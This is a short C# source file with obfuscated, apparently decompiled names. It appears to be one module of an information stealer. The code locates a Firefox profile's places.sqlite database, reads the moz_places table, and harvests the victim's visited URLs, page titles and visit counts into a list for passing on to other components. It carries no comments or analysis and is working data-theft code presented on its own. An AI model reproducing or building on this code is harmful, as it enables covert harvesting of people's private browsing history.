using System;
using System.Collections.Generic;
using System.IO;
using ns12;
using ns13;

namespace ns10;

internal class Class37
{
	private static string smethod_0(string string_0)
	{
		try
		{
			string path = string_0 + "\\Profiles";
			if (Directory.Exists(path))
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\places.sqlite"))
					{
						return text + "\\places.sqlite";
					}
				}
			}
		}
		catch
		{
		}
		return null;
	}

	public static List<Struct5> smethod_1(string string_0)
	{
		List<Struct5> list = new List<Struct5>();
		try
		{
			Class58 @class = Class59.smethod_0(smethod_0(string_0), "moz_places");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Struct5 item = default(Struct5);
				item.String_1 = Class47.smethod_2(@class.method_0(i, 2));
				item.String_0 = Class47.smethod_2(@class.method_0(i, 1));
				item.Int32_0 = Convert.ToInt32(@class.method_0(i, 4)) + 1;
				if (item.String_1 != "0")
				{
					Class54.smethod_4(item.String_0);
					Class55.int_4++;
					list.Add(item);
				}
			}
			return list;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return new List<Struct5>();
	}
}
